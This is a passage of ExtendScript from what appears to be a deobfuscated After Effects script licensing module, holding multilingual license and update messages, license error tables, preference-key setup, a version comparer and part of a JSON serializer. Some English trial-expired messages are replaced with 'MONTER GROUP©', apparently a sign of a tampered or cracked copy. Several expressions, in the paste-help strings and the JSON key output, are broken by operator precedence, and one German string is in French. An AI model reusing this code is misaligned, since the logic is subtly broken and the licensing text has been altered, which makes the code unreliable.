      es:
        strScriptName +
        ' necesita poder escribir archivos\nVaya al panel "' +
        strAllowScriptsPrefsSection +
        '" de las Preferencias y aseg\xfarese de que "Permitir que los scripts puedan escribir archivos y acceder a la red" est\xe1 marcado.\n',
      fr:
        strScriptName +
        " n\xe9cessite les droits d\'\xe9criture de fichiers\nAllez dans le panneau \"" +
        strAllowScriptsPrefsSection +
        '" des pr\xe9f\xe9rences de l\'application et cochez \n"Autoriser les scripts \xe0 \xe9crire des fichiers et \xe0 acc\xe9der au r\xe9seau"',
    });
    var strUpdateLicenseHeader = localize({
      de: strScriptName + " Lizenz-Update ben\xf6tigt",
      en: strScriptName + " License Update Required",
      es: strScriptName + " necesita actualizar la licencia",
      fr: "La licence de " + strScriptName + " doit \xeatre mise \xe0 jour",
    });
    var strLicenseDownloadOptions = localize({
      de: 'Alle Deine %t findest Du unter "My Downloads & Licenses" in Deinem aescripts.com Benutzer-Account, oder \xfcber unsere Manager-App.',
      en: 'All your %t are in the "My Downloads & Licenses" section of your aescripts.com user account, or via our Manager App.',
      es: 'Todas sus %t est\xe1n en la secci\xf3n "My Downloads & Licenses" de su cuenta de usuario en aescripts.com, o a trav\xe9s de nuestra App Manager.',
      fr: 'Toutes vos %t se trouvent dans la section "My Downloads & Licenses" de votre compte utilisateur sur aescripts.com, ou via notre App Manager.',
    });
    var strMyDownloads = localize({
      de: "Gehen Sie zu My Downloads & Licenses",
      en: "Go to My Downloads & Licenses",
      es: "Ir a My Downloads & Licenses",
      fr: "Aller \xe0 My Downloads & Licenses",
    });
    var strDownloadManager = localize({
      de: "Laden Sie die Manager-App herunter",
      en: "Download Manager App",
      es: "Descargar App Manager",
      fr: "T\xe9l\xe9charger App Manager",
    });
    var strOldLicenseFormat = localize({
      de: "Die Lizenz sollte so aussehen:\n\nFirstname**Lastname**111111111SUL",
      en: "License should look like this:\n\nFirstname**Lastname**111111111SUL",
      es: "La licencia debe tener este aspecto:\n\nNombre**Apellido**111111111SUL",
      fr: "Votre licence doit \xeatre similaire \xe0 : \n\nPr\xe9nom**Nom**111111111SUL",
    });
    var strNewLicenseFormat = localize({
      de: "Die Lizenz sollte so aussehen:\n\nPRODUCTID*FIRSTNAME*LASTNAME*1111111SUL1",
      en: "License should look like this:\n\nPRODUCTID*FIRSTNAME*LASTNAME*1111111SUL1",
      es: "La licencia debe tener este aspecto:\n\nPRODUCTID*NOMBRE*APELLIDO*1111111SUL1",
      fr: "Votre licence doit \xeatre similaire \xe0 : \n\nPRODUCTID*PRENOM*NOM*1111111SUL1",
    });
    var strRegistration = localize({
      de: "Registriert f\xfcr: ",
      en: "Registered to: ",
      es: "Registrado a: ",
      fr: "Enregistr\xe9 pour: ",
    });
    var strUnknownError = localize({
      de:
        "Es gab einen unerwarteten Fehler\nBitte \xf6ffne hier ein Support-Ticket:\n" +
        supportEmail +
        "\n\nund f\xfcge einen Screenshot der Fehlermeldung bei\n\n",
      en:
        "There was an unexpected error\nPlease please open a support ticket here:\n" +
        supportEmail +
        "\n\nand submit screenshot of this error message\n\n",
      es:
        "Se ha producido un error desconocido\nPor favor habra un ticket de soporte aqui:\n" +
        supportEmail +
        "\n\ny presente una captura de pantalla con este mensaje de error\n\n",
      fr:
        "Une erreur vient de se produire \nVeuillez ouvrir un ticket de service client \xe0 cette adresse:\n" +
        supportEmail +
        "\n\net n\'oubliez pas d\'y joindre une capture d\'\xe9cran de ce message\n\n",
    });
    var strWrongProduct = localize({
      de: "Dieser Lizenz-Code ist f\xfcr ein anderes Produkt, bitte stelle sicher, dass du den richtigen Lizenzcode eingibst\n\n",
      en: "This license code is for a different product, please double check that you are entering the correct license\n\n",
      es: "Este c\xf3digo de licencia es para un producto diferente, por favor, comprobar que esta introduciendo la licencia correcta\n\n",
      fr: "Vous venez d\'entrer la cl\xe9 de licence d\'un autre produit, assurez-vous d\'utiliser la bonne cl\xe9 de licence\n\n",
    });
    var strNewVersionAvailableHdr = localize({
      de: strScriptName + " Update verf\xfcgbar",
      en: strScriptName + " Update Available",
      es: strScriptName + " Actualizaci\xf3n disponible",
      fr: strScriptName + " Mise \xe0 jour disponible",
    });
    var strNewVersionAvailable = localize({
      de:
        "Eine neuere Version von " + strScriptName + " ist verf\xfcgbar: v%\n",
      en: "A newer version of " + strScriptName + " is available: %v\n",
      es:
        "Una versi\xf3n nueva de " +
        strScriptName +
        " est\xe1 disponible: v%\n",
      fr: "Une version plus de " + strScriptName + " est disponible: v%\n",
    });
    var strCurrentVersion = localize({
      de: "Votre version install\xe9e est: v%",
      en: "Your installed version is: %v",
      es: "Su versi\xf3n instalada es: v%",
      fr: "Votre version install\xe9e est: v%",
    });
    var strDownload = localize({
      de: "Download",
      en: "Download",
      es: "Descargar",
      fr: "T\xe9l\xe9charger",
    });
    var strVersion = localize({
      de: "Version",
      en: "version",
      es: "versi\xf3n",
      fr: "version",
    });
    var strSkipVersion = localize({
      de: "Diese Version \xdcberspringen",
      en: "Skip this Version",
      es: "Salta esta versi\xf3n",
      fr: "Ignorer cette version",
    });
    var strRemindMeLater = localize({
      de: "Erinnere mich sp\xe4ter",
      en: "Remind Me Later",
      es: "Recu\xe9rdame m\xe1s tarde",
      fr: "Rappelle-moi plus tard",
    });
    var strNewestVersionAvailable = localize({
      de: "Neueste verf\xfcgbare Version",
      en: "Newest available version",
      es: "Versi\xf3n mas nueva disponible",
      fr: "Nouvelle version disponible",
    });
    var strVersionRev = localize({
      de: "v%a%b - %c",
      en: "v%a%b - %c",
      es: "v%a%b - %c",
      fr: "v%a%b - %c",
    });
    var strDeactivate = localize({
      de: "Lizenz Deaktivieren",
      en: "Deactivate License",
      es: "Desactivar Licencia",
      fr: "D\xe9sactiver la licence",
    });
    var strVersionCheck = localize({
      de: "Automatisch nach Aktualisierungen suchen",
      en: "Check for updates automatically",
      es: "Revisar actualizaciones automaticamente",
      fr: "V\xe9rifier les mises \xe0 jour automatiquement",
    });
    var strCheckNow = localize({
      de: "Jetzt nach Update suchenn",
      en: "Check for update now",
      es: "Buscar actualizaci\xf3n ahora",
      fr: "V\xe9rifier les mise \xe0 jour maintenant",
    });
    var strUpdateCheckError = localize({
      de: "Bei der Suche nach Updates ist ein Fehler aufgetreten.\nBitte vergewissern Sie sich, dass Sie \xfcber eine g\xfcltige Internetverbindung verf\xfcgen und diese nicht durch Firewalls blockiert wird.",
      en: "There was an error when checking for updates.\nPlease verify that you have a valid internet connection and that it is not blocked by any firewalls.",
      es: "Hubo un error en la comprobaci\xf3n de actualizaciones.\nPor favor compruebe que tiene una conexi\xf3n a Internet v\xe1lida y que no est\xe9 bloqueada por un cortafuegos.",
      fr: "Une erreur s\'est produite lors de la recherche de mises \xe0 jour.\nV\xe9rifiez que votre connexion Internet est valide et qu\'elle n\'est bloqu\xe9e par aucun pare-feu.",
    });
    var strUpToDate = localize({
      de:
        "Sie sind auf dem neuesten Stand! \n" +
        strScriptName +
        " " +
        strVersion +
        " " +
        strScriptVersion +
        " ist derzeit die neueste Version verf\xfcgbar.",
      en:
        "You are up to date!\n" +
        strScriptName +
        " " +
        strVersion +
        " " +
        strScriptVersion +
        " is currently the latest version available.",
      es:
        "\xa1Est\xe1 actualizado! \n" +
        strScriptName +
        " " +
        strVersion +
        " " +
        strScriptVersion +
        " es actualmente la \xfaltima versi\xf3n disponible.",
      fr:
        "Vous \xeates \xe0 jour!\n" +
        strScriptName +
        " " +
        strVersion +
        " " +
        strScriptVersion +
        " est actuellement la derni\xe8re version disponible.",
    });
    var strInvalidLicense = localize({
      de: "Ung\xfcltige Lizenz",
      en: "Invalid license",
      es: "La licencia no es v\xe1lida",
      fr: "Licence non valide",
    });
    var strLicenseRemoved = localize({
      de: "Lizenz entfernt",
      en: "License removed",
      es: "Licencia eliminada",
      fr: "Licence supprim\xe9e",
    });
    var strLicense = localize({
      de: "Lizenz",
      en: "License",
      es: "Licencia",
      fr: "Licence",
    });
    var strLicenseEnds = localize({
      de: "Lizenzlaufzeit endet: ",
      en: "License expires: ",
      es: "Licencia expira: ",
      fr: "Licence expir\xe9e: ",
    });
    var strBTA = localize({
      de: "Beta-Lizenz",
      en: "Beta License",
      es: "Licencia Beta",
      fr: "Licence Beta",
    });
    var strEDU = localize({
      de: "EDU-Lizenz",
      en: "Educational License",
      es: "Licencia Educacional",
      fr: "T\xe9l\xe9charger",
    });
    var strFLT = localize({
      de: "Floating-Lizenz",
      en: "Floating License",
      es: "Licencia flotante",
      fr: "Licence flottante",
    });
    var strUNKNOWN = localize({
      de: "License mit unbekanntem Typ",
      en: "License of unknown type",
      es: "Licencia de tipo desconocido",
      fr: "Licence inconnue",
    });
    var strTrialExpired = localize({
      de: "Testversion abgelaufen",
      en: "MONTER GROUP\xa9",
      es: "Termino de prueba expirado",
      fr: "\xc9valuation termin\xe9e",
    });
    var licErrors = {
      de: {
        "-1": { detail: "", title: "Ung\xfcltige Lizenz (-1)" },
        "-10": {
          detail: "Auf dem Lizenzserver sind alle Lizenzen bereits vergeben",
          title: "Keine freien Slots (-10)",
        },
        "-100": {
          detail:
            "Eine Lizenz kann \xfcber den Button \'Lizenz Kaufen\' erworben werden",
          title: "Testversion abgelaufen",
        },
        "-101": {
          detail:
            "Bitte konfigurieren oder deaktivieren Sie alle Firewalls oder Virenprogramme, die den Zugriff auf den Basisordner blockieren k\xf6nnten. Wenn dieser Zugriff blockiert ist, kann die Lizenz nicht verifiziert werden.",
          title: "Zugriff blockiert (-101)",
        },
        "-102": {
          detail:
            "Bitte kontaktieren Sie den Support und senden Sie einen Screenshot dieses Fehlers. " +
            supportEmail,
          title: "Kein Ergebnis (-102)",
        },
        "-103": {
          detail: "Could not find the number of trial days",
          title: "Anzahl der Test-Tage nicht festgelegt (-103)",
        },
        "-104": {
          detail: "Die Lizenz ist nicht f\xfcr dieses Produkt",
          title: "Ung\xfcltige Lizenz (-104)",
        },
        "-105": {
          detail:
            "Eine Beta-Lizenz kann f\xfcr diese Vollversion nicht verwendet werden",
          title: "Beta-Lizenz nicht verwendbar (-105)",
        },
        "-106": {
          detail:
            "Dieses Produkt beinhaltet keine Testversion und ben\xf6tigt eine Lizenz",
          title: "Bitte Lizenz installieren (-106)",
        },
        "-107": {
          detail:
            "Diese Beta beinhaltet keine Testversion und ben\xf6tigt eine Lizenz",
          title: "Bitte Lizenz installieren (-107)",
        },
        "-108": {
          detail:
            "Bitte konfigurieren oder deaktivieren Sie alle Firewalls oder Virenprogramme, die den Zugriff auf den Basisordner blockieren k\xf6nnten. Wenn dieser Zugriff blockiert ist, kann die Lizenz nicht verifiziert werden.",
          title: "Nicht in der Lage, auf den Home-Ordner zuzugreifen (-108)",
        },
        "-11": {
          detail: "Die Lizenz kann auf dem Lizenzserver nicht gefunden werden",
          title: "Unbekannte Lizenz (-11)",
        },
        "-12": {
          detail:
            "Die Lizenz konnte nicht deaktiviert werden, da sie dem Server unbekannt ist",
          title: "Unbekannte Lizenz (-12)",
        },
        "-13": {
          detail:
            "Die IP-Adresse dieses Rechners ist \xfcber eine Blacklist auf dem Lizenzserver gesperrt",
          title: "Klient ist auf Blacklist (-13)",
        },
        "-14": {
          detail: "Konnte keine Netzwerkkarte finden",
          title: "Keine Netzwerkkarte (-14)",
        },
        "-2": { detail: "", title: "Ung\xfcltige Lizenz (-2)" },
        "-20": {
          detail: "Lizenzlaufzeit beginnt am ",
          title: "Lizenzlaufzeit hat noch nicht begonnen (-20)",
        },
        "-21": {
          detail: "Lizenzlaufzeit endete am ",
          title: "Lizenzlaufzeit ist abgelaufen (-21)",
        },
        "-22": {
          detail:
            "Weitere Informationen zum Einrichten und Lizenzieren von Client-Computern finden Sie in den Anweisungen zum Server.",
          title:
            "Floating-Lizenzen k\xf6nnen nur mit dem Floating License Server verwendet werden (-22)",
        },
        "-3": { detail: "", title: "Lizenzdatei nicht gefunden (-3)" },
        "-4": { detail: "", title: "Lizenzdatei besch\xe4digt (-4)" },
        "-5": { detail: "", title: "Generischer Fehler (-5)" },
        "-6": { detail: "", title: "Ung\xfcltiger Produktname (-6)" },
        "-7": { detail: "", title: "Testversion (-7)" },
        "-8": { detail: "", title: "Ung\xfcltige Lizenz (-8)" },
        "-9": {
          detail:
            "Bitte stellen Sie sicher, dass der Lizenzserver ordnungsgem\xe4\xdf arbeitet",
          title: "Kann Server nicht kontaktieren (-9)",
        },
        "-99": { detail: "", title: "Unbekannter Fehler (-99)" },
        unknown: { detail: "", title: "Unbekannter Fehler (0)" },
      },
      en: {
        "-1": { detail: "", title: "Invalid license (-1)" },
        "-10": {
          detail: "There are no more free slots on the license server",
          title: "No free slots (-10)",
        },
        "-100": {
          detail:
            "You can purchase a license by clicking the button \'Buy License\'",
          title: "MONTER GROUP\xa9",
        },
        "-101": {
          detail:
            "Please configure or disable any firewalls or virus software that might be blocking access to the home folder. If this access is blocked the license cannot be verified.",
          title: "Access Blocked(-101)",
        },
        "-102": {
          detail:
            "Please contact support " +
            supportEmail +
            " and send a screenshot of this error.\n\n",
          title: "No result code (-102)",
        },
        "-103": {
          detail: "Could not find the number of trial days",
          title: "No trial days found (-103)",
        },
        "-104": {
          detail: "The license is not for this product",
          title: "License mismatch (-104)",
        },
        "-105": {
          detail: "A beta license cannot be used for the full version",
          title: "Cannot use beta license (-105)",
        },
        "-106": {
          detail: "This product does not offer a trial and requires a license",
          title: "Please install a license (-106)",
        },
        "-107": {
          detail:
            "The beta version does not offer a trial and requires a license",
          title: "Please install a license (-107)",
        },
        "-108": {
          detail:
            "Please configure or disable any firewalls or virus software that might be blocking access to the home folder. If this access is blocked the license cannot be verified.",
          title: "Not able to access home folder (-108)",
        },
        "-11": {
          detail: "The license cannot be found on the license server",
          title: "Unknown license (-11)",
        },
        "-12": {
          detail:
            "The license you are trying to deactivate is not found on the license server",
          title: "Unknown license (-12)",
        },
        "-13": {
          detail: "Your client IP is blacklisted on the license server",
          title: "Client blacklisted (-13)",
        },
        "-14": {
          detail: "Could not find a network adapter",
          title: "No network adapter (-14)",
        },
        "-2": { detail: "", title: "Invalid license (-2)" },
        "-20": {
          detail: "License period starts on ",
          title: "License period has not started yet (-20)",
        },
        "-21": {
          detail: "License period ended on ",
          title: "License period has ended (-21)",
        },
        "-22": {
          detail:
            "Please refer to the server instructions on how to setup and license client machines.",
          title:
            "Floating licenses can only be used with the Floating License Server (-22)",
        },
        "-3": { detail: "", title: "License file not found (-3)" },
        "-4": { detail: "", title: "License file corrupted (-4)" },
        "-5": { detail: "", title: "Generic error (-5)" },
        "-6": { detail: "", title: "Invalid product name (-6)" },
        "-7": { detail: "", title: "Trial (-7)" },
        "-8": { detail: "", title: "Invalid license (-8)" },
        "-9": {
          detail: "Please make sure the license server is running properly",
          title: "Cannot connect to server (-9)",
        },
        "-99": { detail: "", title: "Unknown error (-99)" },
        unknown: { detail: "", title: "Unknown error (0)" },
      },
      es: {
        "-1": { detail: "", title: "La licencia no es v\xe1lida (-1)" },
        "-10": {
          detail: "No hay m\xe1s espacios libres en el servidor de licencias",
          title: "No hay espacios libres (-10)",
        },
        "-100": {
          detail:
            "Puede adquirir una licencia haciendo clic en el bot\xf3n \'Comprar Licencia\'",
          title: "Esta versi\xf3n de prueba se ha expirado",
        },
        "-101": {
          detail:
            "Configure o desactive cualquier firewall o software antivirus que pueda estar bloqueando el acceso a la carpeta de inicio. Si este acceso est\xe1 bloqueado, la licencia no se puede verificar.",
          title: "Acceso bloqueado (-101)",
        },
        "-102": {
          detail:
            "Por favor, p\xf3ngase en contacto con soporte y env\xede una captura de pantalla de este error. " +
            supportEmail,
          title: "No hay c\xf3digo de resultado (-102)",
        },
        "-103": {
          detail: "No se pudo encontrar el n\xfamero de d\xedas de prueba",
          title: "No se encontraron d\xedas de prueba (-103)",
        },
        "-104": {
          detail: "La licencia no es para este producto",
          title: "La licencia no es la correcta (-104)",
        },
        "-105": {
          detail:
            "No se puede utilizar una licencia \'beta\' con esta versi\xf3n",
          title: "No se puede usar licencia beta (-105)",
        },
        "-106": {
          detail:
            "Este producto no ofrece una version de prueba y requiere una licencia",
          title: "Por favor, instale una licencia (-106)",
        },
        "-107": {
          detail:
            "La versi\xf3n beta no ofrece una versi\xf3n de prueba y requiere una licencia",
          title: "Por favor, instale una licencia (-107)",
        },
        "-108": {
          detail:
            "Configure o desactive cualquier firewall o software antivirus que pueda estar bloqueando el acceso a la carpeta de inicio. Si este acceso est\xe1 bloqueado, la licencia no se puede verificar.",
          title: "No se puede acceder a la carpeta de inicio (-108)",
        },
        "-11": {
          detail:
            "No se puede encontrar esta licencia en el servidor de licencias",
          title: "Licencia desconocida (-11)",
        },
        "-12": {
          detail:
            "La licencia que est\xe1 intentando de desactivar no se encuentra en el servidor de licencias",
          title: "Licencia desconocida (-12)",
        },
        "-13": {
          detail: "Su IP est\xe1 en la lista negra del servidor de licencias",
          title: "IP en la lista negra (-13)",
        },
        "-14": {
          detail: "No se pudo encontrar un adaptador de red",
          title: "No hay adaptador de red (-14)",
        },
        "-2": { detail: "", title: "La licencia no es v\xe1lida (-2)" },
        "-20": {
          detail: "El per\xedodo de licencia comienza en ",
          title: "El periodo de licencia no ha comenzado (-20)",
        },
        "-21": {
          detail: "El per\xedodo de licencia termin\xf3 en ",
          title: "El per\xedodo de licencia ha terminado (-21)",
        },
        "-22": {
          detail:
            "Consulte las instrucciones del servidor sobre c\xf3mo configurar y licenciar las m\xe1quinas cliente.",
          title:
            "Las licencias flotantes solo se pueden utilizar con el Servidor de licencias flotantes (-22)",
        },
        "-3": {
          detail: "",
          title: "No se encontr\xf3 el archivo de licencia (-3)",
        },
        "-4": {
          detail: "",
          title: "El archivo de licencia esta da\xf1ado (-4)",
        },
        "-5": { detail: "", title: "Error generico (-5)" },
        "-6": {
          detail: "",
          title: "El nombre de el producto no v\xe1lido (-6)",
        },
        "-7": { detail: "", title: "Versi\xf3n de prueba (-7)" },
        "-8": { detail: "", title: "La licencia no es v\xe1lida (-8)" },
        "-9": {
          detail:
            "Aseg\xfarese de que el servidor de licencias est\xe1 funcionando correctamente",
          title: "No es posible conectar con el servidor (-9)",
        },
        "-99": { detail: "", title: "Error desconocido (-99)" },
        unknown: { detail: "", title: "Error desconocido (0)" },
      },
      fr: {
        "-1": { detail: "", title: "Licence non valide (-1)" },
        "-10": {
          detail: "Il n\'y a plus de place sur le serveur de licence",
          title: "Plus de place (-10)",
        },
        "-100": {
          detail:
            "Vous pouvez acqu\xe9rir une licence en cliquant sur le bouton \'Acheter une Licence\' ci-dessous",
          title: "P\xe9riode d\'\xe9valuation expir\xe9e",
        },
        "-101": {
          detail:
            "Veuillez configurer ou d\xe9sactiver tous les firewall ou logiciels antivirus susceptibles de bloquer l\'acc\xe8s au dossier de d\xe9part. Si cet acc\xe8s est bloqu\xe9, la licence ne peut pas \xeatre v\xe9rifi\xe9e.",
          title: "Acc\xe8s bloqu\xe9 (-101)",
        },
        "-102": {
          detail:
            "S\'il vous pla\xeet contacter le support et envoyer une capture d\'\xe9cran de cette erreur. " +
            supportEmail,
          title: "Pas de code de r\xe9sultat (-102)",
        },
        "-103": {
          detail:
            "Echec d\'identification du nombre de jour de p\xe9riode d\'essai disponible",
          title: "Impossible de trouver des jours d\'essai (-103)",
        },
        "-104": {
          detail: "Cette licence n\'est pas valable pour ce produit",
          title: "Mauvaise licence (-104)",
        },
        "-105": {
          detail:
            "Une licence de version Beta ne peut \xeatre utilis\xe9e pour le produit final",
          title: "Licence Beta invalide (-105)",
        },
        "-106": {
          detail:
            "Ce produit ne propose pas de p\xe9riode d\'essai et n\xe9cessite une licence",
          title: "Licence n\xe9cessaire (-106)",
        },
        "-107": {
          detail:
            "La version Beta de ce produit ne propose pas de p\xe9riode d\'essai et n\xe9cessite une licence",
          title: "Licence n\xe9cessaire (-107)",
        },
        "-108": {
          detail:
            "Veuillez configurer ou d\xe9sactiver tous les firewall ou logiciels antivirus susceptibles de bloquer l\'acc\xe8s au dossier de d\xe9part. Si cet acc\xe8s est bloqu\xe9, la licence ne peut pas \xeatre v\xe9rifi\xe9e.",
          title: "Impossible d\'acc\xe9der au dossier de d\xe9part (-108)",
        },
        "-11": {
          detail: "La licence est introuvable sur le serveur",
          title: "Licence inconnue (-11)",
        },
        "-12": {
          detail:
            "La licence que vous essayez de d\xe9sactiver est introuvable sur le serveur",
          title: "Licence inconnue (-12)",
        },
        "-13": {
          detail:
            "L\'adresse ip de votre client est bannie du serveur de licence",
          title: "Client sur liste noire (-13)",
        },
        "-14": {
          detail: "Impossible de trouver une carte r\xe9seau",
          title: "Pas de carte r\xe9seau (-14)",
        },
        "-2": { detail: "", title: "Licence non valide (-2)" },
        "-20": {
          detail: "La p\xe9riode de licence commence ",
          title: "La p\xe9riode de licence n\'a pas encore commenc\xe9 (-20)",
        },
        "-21": {
          detail: "La p\xe9riode de licence s\'est termin\xe9e le ",
          title: "La p\xe9riode de licence est termin\xe9e (-21)",
        },
        "-22": {
          detail:
            "Veuillez vous reporter aux instructions du serveur pour savoir comment configurer et attribuer une licence aux ordinateurs clients.",
          title:
            "Les licences flottantes ne peuvent \xeatre utilis\xe9es qu\'avec le serveur de licences flottantes (-22)",
        },
        "-3": { detail: "", title: "Fichier de licence introuvable (-3)" },
        "-4": { detail: "", title: "Fichier de licence corrompu (-4)" },
        "-5": { detail: "", title: "Erreur g\xe9n\xe9rique (-5)" },
        "-6": { detail: "", title: "Nom de produit invalide (-6)" },
        "-7": { detail: "", title: "P\xe9riode d\'\xe9valuation (-7)" },
        "-8": { detail: "", title: "Licence non valide (-8)" },
        "-9": {
          detail: "Verifiez que le serveur de licence fonctionne correctement",
          title: "Impossible de se connecter au serveur (-9)",
        },
        "-99": { detail: "", title: "Erreur inconnue (-99)" },
        unknown: { detail: "", title: "Erreur inconnue (0)" },
      },
    };
    var prefsSectionName = vars.hasOwnProperty("legacyPrefsGroup")
      ? vars.legacyPrefsGroup
      : "aescripts";
    var prefsName = useLegacyPrefsHeader
      ? strScriptName
      : strHeader + "_Registration";
    var prefsVersionName = strHeader + "_Version";
    var prefsLicVersion = strHeader + "_LicVersion";
    var prefsVersionCheckInit = strHeader + "_VersionCheckInit";
    var prefsLastVersionChecked = strHeader + "_LastVersionChecked";
    var prefsLastServerVersionChecked = strHeader + "_LastServerVersionChecked";
    var prefsLastTimeVersionChecked = strHeader + "_LastTimeVersionChecked";
    var prefsNextTimeVersionChecked = strHeader + "_NextTimeVersionChecked";
    var prefsNextTimeVersionCheckedSkipVersion =
      strHeader + "_NextTimeVersionCheckedSkipVersion";
    var prefsDoUpdateCheck = strHeader + "_doUpdateCheck";
    haveSettings(prefsSectionName, prefsDoUpdateCheck) &&
      (doUpdateCheck = !(
        "false" == getSettings(prefsSectionName, prefsDoUpdateCheck)
      ));
    ScriptUI.environment.keyboardState.shiftKey &&
      ScriptUI.environment.keyboardState.altKey &&
      !ScriptUI.environment.keyboardState.ctrlKey &&
      !ScriptUI.environment.keyboardState.metaKey &&
      ((doUpdateCheck = false),
      saveSettings(prefsSectionName, prefsDoUpdateCheck, false),
      alert("New version update checks disabled"));
    saveSettings(prefsSectionName, prefsVersionName, strScriptVersion);
    saveSettings(prefsSectionName, prefsLicVersion, licensingVersion);
    cmdKey = -1 != $.os.indexOf("Mac") ? "cmd" : "Ctrl";
    var strEnterLicenseCode = localize({
      de: "Bitte gebe den Lizenzcode ein.",
      en: "Please enter the license code.",
      es: "Por favor, introduzca el c\xf3digo de licencia.",
      fr: "Veuillez entrer votre num\xe9ro de licence.",
    });
    var strPasteHelp = localize({
      de:
        "(Wenn das Einf\xfcgen mit " +
        cmdKey +
        "+V nicht funktioniert, versuche Bearbeiten->Einf\xfcgen.)",
      en:
        "(If pasting the code with " + cmdKey + "+V doesn\'t work try " + 10 <=
        parseFloat(app.version)
          ? "Right-Click and Paste)"
          : "Edit->Paste)",
      es:
        "(Si pegar la licencia usando " +
          cmdKey +
          "+V no funciona, pruebe " +
          10 <=
        parseFloat(app.version)
          ? "Clic derecho y pegar)"
          : "Edici\xf3n->Pegar)",
      fr:
        "(Si vous ne parvenez pas \xe0 coller le code avec " +
          cmdKey +
          "+V essayez " +
          10 <=
        parseFloat(app.version)
          ? "Clique droit et Coller)"
          : "Edition->Coller)",
    });
    var strTrialInstructMsg = localize({
      de: 'Um die Testversion zu starten, gebe "trial" ein.',
      en: "To run in trial mode type: trial",
      es: "Para ejecutar el modo Trial, escriba: trial",
      fr: "Pour lancer la version de d\xe9monstration, tapez : trial",
    });
    var strOr = localize({ de: "oder", en: "or", es: "o", fr: "ou" });
    var strServerInstructMsg = localize({
      de: "Aktivieren Sie eine Lizenz vom Server mit @REMOTE",
      en: "Activate a license from the server with @REMOTE",
      es: "Activar una licencia del servidor con @REMOTE",
      fr: "Activer une licence du serveur avec @REMOTE",
    });
    var strServerNotRunning = localize({
      de: "Der Client ist konfiguriert, aber der Floating License Server l\xe4uft nicht oder ist nicht erreichbar.",
      en: "Client configured but floating license server is either not running or not accessible.",
      es: "Cliente configurado pero servidor de licencias flotantes o no est\xe1 ejecutado o no es accesible.",
      fr: "Client configur\xe9 mais le serveur de licence flottante est soit en cours d\'ex\xe9cution ou ne pas accessible.",
    });
    var prefHeader = "Initialization Fragments";
    var prefSection1 = (
      string_encode(
        Math.floor(parseFloat(app.version))
          .toString()
          .charAt(
            Math.max(
              0,
              Math.floor(parseFloat(app.version)).toString().length - 1,
            ),
          ) +
          strScriptName.substring(
            Math.max(0, strScriptName.length - 15),
            strScriptName.length,
          ) +
          strScriptVersion,
      ) *
      0.457 *
      privateNum
    ).toString(36);
    var prefSection2 = (
      string_encode(
        Math.floor(parseFloat(app.version))
          .toString()
          .charAt(
            Math.max(
              0,
              Math.floor(parseFloat(app.version)).toString().length - 1,
            ),
          ) +
          strScriptName.substring(
            Math.max(0, strScriptName.length - 15),
            strScriptName.length,
          ) +
          strScriptVersion,
      ) *
      (privateNum / 3.981)
    ).toString(36);
    var prefsLocation = Folder.userData.fsName + "/Aescripts/";
    var prefsPrefix = "pref_";
    isAE() || Folder(prefsLocation).exists || Folder(prefsLocation).create();
    var sanitizedName = sanitizeProductName(strScriptName);
    this.getSetting = function (e, i) {
      return getSettings((e = strHeader + "_" + e), i, "settings");
    };
    this.readJSON = function (e) {
      return readJSON(e);
    };
    this.writeJSON = function (e, i) {
      return writeJSON(e, i);
    };
    this.JSONify = function (e, i, t) {
      return JSONify(e, i, t);
    };
    this.haveSetting = function (e, i) {
      return haveSettings((e = strHeader + "_" + e), i, "settings");
    };
    this.saveSetting = function (e, i, t) {
      return saveSettings((e = strHeader + "_" + e), i, t, "settings");
    };
    function compareVersions(a, b) {
      if (a === b) {
        return 0;
      }
      var a_components = a.toString().split(".");
      var b_components = b.toString().split(".");
      if (a_components.length <= 2 && b_components.length <= 2) {
        if (a > b) {
          return 1;
        }
        if (a < b) {
          return -1;
        }
      } else {
        var len = Math.min(a_components.length, b_components.length);
        for (var i = 0; i < len; i += 1) {
          if (parseInt(a_components[i]) > parseInt(b_components[i])) {
            return 1;
          }
          if (parseInt(a_components[i]) < parseInt(b_components[i])) {
            return -1;
          }
        }
        if (a_components.length > b_components.length) {
          return 1;
        }
        if (a_components.length < b_components.length) {
          return -1;
        }
        return 0;
      }
    }
    function JSONify(string, mode, prettyJSON) {
      if (typeof JSON !== "object") {
        JSON = {};
      }
      (function () {
        function f(n) {
          return n < 10 ? "0" + n : n;
        }
        function this_value() {
          return this.valueOf();
        }
        function quote(string) {
          rx_escapable.lastIndex = 0;
          return rx_escapable.test(string)
            ? '"' +
                string.replace(rx_escapable, function (a) {
                  var c = meta[a];
                  return typeof c === "string"
                    ? c
                    : "\\u" + ("0000" + a.charCodeAt(0).toString(16)).slice(-4);
                }) +
                '"'
            : '"' + string + '"';
        }
        function str(key, holder) {
          var mind = gap;
          var value = holder[key];
          if (
            value &&
            typeof value === "object" &&
            typeof value.toJSON === "function"
          ) {
            value = value.toJSON(key);
          }
          if (typeof rep === "function") {
            value = rep.call(holder, key, value);
          }
          switch (typeof value) {
            case "string":
              return quote(value);
            case "number":
              return isFinite(value) ? String(value) : "null";
            case "boolean":
            case "null":
              return String(value);
            case "object":
              if (!value) {
                return "null";
              }
              gap += indent;
              partial = [];
              if (Object.prototype.toString.apply(value) === "[object Array]") {
                length = value.length;
                for (var i = 0; i < length; i += 1) {
                  partial[i] = str(i, value) || "null";
                }
                v =
                  partial.length === 0
                    ? "[]"
                    : gap
                      ? "[\n" +
                        gap +
                        partial.join(",\n" + gap) +
                        "\n" +
                        mind +
                        "]"
                      : "[" + partial.join(",") + "]";
                gap = mind;
                return v;
              }
              if (rep && typeof rep === "object") {
                length = rep.length;
                for (var i = 0; i < length; i += 1) {
                  if (typeof rep[i] === "string") {
                    k = rep[i];
                    v = str(k, value);
                    if (v) {
                      partial.push(quote(k) + gap ? ": " : ":" + v);
                    }
                  }
                }
              } else {
                for (var k in value) {
                  if (Object.prototype.hasOwnProperty.call(value, k)) {
                    v = str(k, value);
                    if (v) {
                      partial.push(quote(k) + gap ? ": " : ":" + v);
                    }
                  }
                }
              }
              v =
                partial.length === 0
                  ? "{}"
                  : gap
                    ? "{\n" +
                      gap +
                      partial.join(",\n" + gap) +
                      "\n" +
                      mind +
                      "}"
                    : "{" + partial.join(",") + "}";
              gap = mind;
              return v;
          }
        }
        ("use strict");
        var rx_one = /^[\],:{}\s]*$/;
        var rx_two = /\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g;
        var rx_three =
          /"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g;
        var rx_four = /(?:^|:|,)(?:\s*\[)+/g;
        var rx_escapable =
